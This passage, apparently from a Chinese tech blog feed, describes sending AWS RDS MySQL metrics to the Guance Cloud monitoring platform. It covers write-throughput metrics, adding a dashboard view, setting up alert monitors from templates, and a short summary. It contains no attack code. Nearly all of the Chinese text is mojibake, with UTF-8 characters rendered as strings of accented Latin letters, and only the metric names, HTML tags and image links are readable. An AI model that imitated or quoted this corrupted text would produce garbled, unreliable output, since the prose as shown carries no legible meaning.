å®ä¾‹å­˜å‚¨å·çš„æ•°æ®åº“å®ä¾‹ç±»ã€‚</td><td>æ¯«ç§’</td></tr><tr><td>WriteThroughput</td><td>å†™å…¥ååé‡ï¼ˆMB/ç§’ï¼‰</td><td>æ¯ç§’å†™å…¥ç£ç›˜çš„å¹³å‡å­—èŠ‚æ•°ã€‚</td><td>æ¯ç§’å­—èŠ‚æ•°</td></tr><tr><td>WriteThroughputLocalStorage</td><td>å†™å…¥ååé‡æœ¬åœ°å­˜å‚¨ï¼ˆMB/ç§’ï¼‰</td><td>æœ¬åœ°å­˜å‚¨æ¯ç§’å†™å…¥ç£ç›˜çš„å¹³å‡å­—èŠ‚æ•°ã€‚æ­¤æŒ‡æ ‡ä»…é€‚ç”¨äºå…·æœ‰ NVMe SSD å®ä¾‹å­˜å‚¨å·çš„æ•°æ®åº“å®ä¾‹ç±»ã€‚</td><td>æ¯ç§’å­—èŠ‚æ•°</td></tr></tbody></table>
<h3 data-id="heading-4">åœºæ™¯è§†å›¾</h3>
<p>ç™»å½•è§‚æµ‹äº‘æ§åˆ¶å°ï¼Œç‚¹å‡»ã€Œåœºæ™¯ã€ -ã€Œæ–°å»ºä»ªè¡¨æ¿ã€ï¼Œè¾“å…¥ â€œAWS RDSâ€ï¼Œ é€‰æ‹© â€œAWS RDS MySQL ç›‘æ§è§†å›¾â€ï¼Œç‚¹å‡» â€œç¡®å®šâ€ å³å¯æ·»åŠ è§†å›¾ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98bf951ccd604973bc04c1558be63b3b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995228&amp;x-signature=ObEuzEmbe4bK1nbCf63PQKyvMv4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">ç›‘æ§å™¨ï¼ˆå‘Šè­¦ï¼‰</h3>
<p>è§‚æµ‹äº‘å†…ç½®äº†ç›‘æ§å™¨æ¨¡æ¿ï¼Œå¯ä»¥é€‰æ‹©ä»æ¨¡ç‰ˆåˆ›å»ºç›‘æ§å™¨ï¼Œå¹¶å¼€å¯é€‚åˆä¸šåŠ¡çš„ç›‘æ§å™¨ä»¥åŠæ—¶é€šçŸ¥ç›¸å…³æˆå‘˜å…³æ³¨é—®é¢˜ï¼Œè§¦å‘æ¡ä»¶ã€é¢‘ç‡ç­‰ä¿¡æ¯å¯ä»¥ä¾æ®å®é™…ä¸šåŠ¡è¿›è¡Œè°ƒæ•´ã€‚</p>
<p>ç™»å½•è§‚æµ‹äº‘æ§åˆ¶å°ï¼Œç‚¹å‡»ã€Œç›‘æ§ã€ -ã€Œæ–°å»ºç›‘æ§å™¨ã€ï¼Œè¾“å…¥ â€œAWS RDSâ€ï¼Œ é€‰æ‹©å¯¹åº”çš„ç›‘æ§å™¨ï¼Œç‚¹å‡» â€œç¡®å®šâ€ å³å¯æ·»åŠ ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5dc94873d6f94239ad54e130f080a6f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995228&amp;x-signature=3yM2HW%2Beitjgj1BqXqVZEIgdmBE%3D" alt="" loading="lazy"/></p>
<p>AWS RDS Mysql å®ä¾‹åç§°ä¸º {{DBInstanceIdentifier}} CPU ä½¿ç”¨ç‡è¿‡é«˜</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4864a23848cb4eab9010023d16715b19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995228&amp;x-signature=L5k85Z8Zqq4EfGBjV1tpT36zku4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6">æ€»ç»“</h2>
<p>é€šè¿‡å°† AWS RDS çš„åŸç”Ÿç›‘æ§æ•°æ®é›†æˆåˆ°è§‚æµ‹äº‘å¹³å°ï¼Œç”¨æˆ·å¯ä»¥å®ç°å¯¹å…³ç³»æ•°æ®åº“æœåŠ¡ï¼ˆRDSï¼‰å®ä¾‹çš„å®æ—¶æ€§èƒ½ç›‘æ§ã€èµ„æºä½¿ç”¨åˆ†æä»¥åŠå®‰å…¨äº‹ä»¶çš„å¯è§†åŒ–ã€‚è§‚æµ‹äº‘å¹³å°æä¾›çš„é«˜çº§åˆ†æå’Œå¯è§†åŒ–åŠŸèƒ½ï¼ŒåŒ…æ‹¬å®æ—¶ä»ªè¡¨æ¿ã€æ™ºèƒ½å‘Šè­¦å’Œæ ¹å› åˆ†æï¼Œèƒ½å¤Ÿå¸®åŠ©ç”¨æˆ·å¿«é€Ÿå®šä½æ•°æ®åº“æ€§èƒ½é—®é¢˜ã€ä¼˜åŒ–èµ„æºæˆæœ¬ï¼Œå¹¶ç¡®ä¿æ•°æ®çš„é«˜å¯ç”¨æ€§å’Œå®‰å…¨æ€§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>